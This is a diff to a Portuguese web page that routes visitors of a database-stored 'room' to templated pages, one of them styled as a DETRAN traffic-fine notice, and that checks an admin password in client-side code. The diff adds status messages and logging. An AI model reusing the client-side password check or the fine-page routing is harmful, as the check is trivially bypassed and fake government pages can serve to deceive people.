@@ -87,6 +87,8 @@
 <body>
     <div id="loadingScreen" class="loader">
         <div class="spinner"></div>
+        <p>🔍 Verificando acesso...</p>
+        <p id="statusMsg" style="font-size:0.8rem; margin-top:1rem; color:#888;"></p>
     </div>
 
     <div id="senhaScreen" style="display: none;">
@@ -111,17 +113,23 @@
         const salaId = urlParams.get('id');
 
         async function redirecionarCliente() {
+            const statusMsg = document.getElementById('statusMsg');
+            
             if (!salaId) {
-                window.location.href = 'index.html';
+                statusMsg.innerHTML = 'ID inválido, redirecionando...';
+                setTimeout(() => { window.location.href = 'index.html'; }, 1000);
                 return;
             }
             
             try {
+                statusMsg.innerHTML = 'Verificando sala...';
+                
                 const snapshot = await db.ref(`casas/${salaId}`).once('value');
                 const sala = snapshot.val();
                 
                 if (!sala) {
-                    window.location.href = 'index.html';
+                    statusMsg.innerHTML = 'Sala não encontrada, redirecionando...';
+                    setTimeout(() => { window.location.href = 'index.html'; }, 1000);
                     return;
                 }
                 
@@ -130,9 +138,13 @@
                 const tema = sala.tema || 'light';
                 const tipoSite = sala.tipoSite || 'normal';
                 
+                statusMsg.innerHTML = `Sala: ${sala.nome} | Tipo: ${tipoSite} | Configurada: ${temConteudo}`;
+                
                 let arquivoDestino = '';
                 
+                // PRIORIDADE: Verificar se está fechada primeiro
                 if (estaFechada) {
+                    statusMsg.innerHTML = 'Sala fechada, redirecionando...';
                     if (tipoSite === 'detran') {
                         arquivoDestino = 'index-multa.html';
                     } else if (tipoSite === 'pessoa') {
@@ -142,39 +154,62 @@
                     } else {
                         arquivoDestino = 'index.html';
                     }
-                    window.location.href = `${arquivoDestino}?id=${salaId}`;
-                } 
-                else if (temConteudo) {
-                    if (tipoSite === 'detran') {
-                        arquivoDestino = 'index-multa.html';
-                    } else if (tipoSite === 'pessoa') {
-                        arquivoDestino = 'index-pessoa.html';
-                    } else if (tema === 'dark') {
-                        arquivoDestino = 'index-dark.html';
-                    } else {
-                        arquivoDestino = 'index.html';
-                    }
-                    window.location.href = `${arquivoDestino}?id=${salaId}`;
-                } 
-                else {
-                    window.location.href = `mobile.html?id=${salaId}`;
+                    setTimeout(() => { window.location.href = `${arquivoDestino}?id=${salaId}`; }, 500);
+                    return;
                 }
+                
+                // SALA CONFIGURADA (tem conteúdo)
+                if (temConteudo) {
+                    statusMsg.innerHTML = 'Sala configurada, redirecionando para visualização...';
+                    
+                    if (tipoSite === 'detran') {
+                        arquivoDestino = 'index-multa.html';
+                        statusMsg.innerHTML = 'Redirecionando para DETRAN...';
+                    } else if (tipoSite === 'pessoa') {
+                        arquivoDestino = 'index-pessoa.html';
+                        statusMsg.innerHTML = 'Redirecionando para página de pessoa...';
+                    } else if (tema === 'dark') {
+                        arquivoDestino = 'index-dark.html';
+                        statusMsg.innerHTML = 'Redirecionando para tema Dark...';
+                    } else {
+                        arquivoDestino = 'index.html';
+                        statusMsg.innerHTML = 'Redirecionando para tema Claro...';
+                    }
+                    
+                    setTimeout(() => { window.location.href = `${arquivoDestino}?id=${salaId}`; }, 500);
+                    return;
+                }
+                
+                // SALA VAZIA - vai para mobile.html configurar
+                statusMsg.innerHTML = 'Sala vazia, redirecionando para configuração...';
+                setTimeout(() => { window.location.href = `mobile.html?id=${salaId}`; }, 500);
                 
             } catch (error) {
                 console.error('Erro:', error);
-                window.location.href = 'index.html';
+                statusMsg.innerHTML = 'Erro de conexão, redirecionando...';
+                setTimeout(() => { window.location.href = 'index.html'; }, 1000);
             }
         }
 
+        // Verificar se já está logado
         const isAdminLogged = sessionStorage.getItem('senha_autorizada_admin') === 'true';
         
+        console.log("Debug - salaId:", salaId);
+        console.log("Debug - isAdminLogged:", isAdminLogged);
+        
+        // Se TEM ID na URL e NÃO é admin logado -> É CLIENTE
         if (salaId && !isAdminLogged) {
+            console.log("Cliente detectado - redirecionando para página correta...");
             redirecionarCliente();
         } 
         else if (isAdminLogged) {
+            // Admin já logado - vai para o admin real
+            console.log("Admin logado - indo para admin-real.html");
             window.location.href = 'admin-real.html';
         }
         else {
+            // Sem ID e sem login - mostrar tela de senha
+            console.log("Mostrando tela de senha");
             document.getElementById('loadingScreen').style.display = 'none';
             document.getElementById('senhaScreen').style.display = 'flex';
             document.getElementById('senhaScreen').style.alignItems = 'center';
@@ -182,6 +217,7 @@
             document.getElementById('senhaScreen').style.minHeight = '100vh';
         }
         
+        // Função de verificar senha
         function verificarSenha() {
             const senhaDigitada = document.getElementById('senhaInput').value;
             const erroDiv = document.getElementById('senhaErro');
@@ -189,6 +225,7 @@
             if (senhaDigitada === SENHA_CORRETA) {
                 sessionStorage.setItem('senha_autorizada_admin', 'true');
                 
+                // Verificar se tem ID na URL
                 if (salaId) {
                     window.location.href = `admin-real.html?id=${salaId}`;
                 } else {
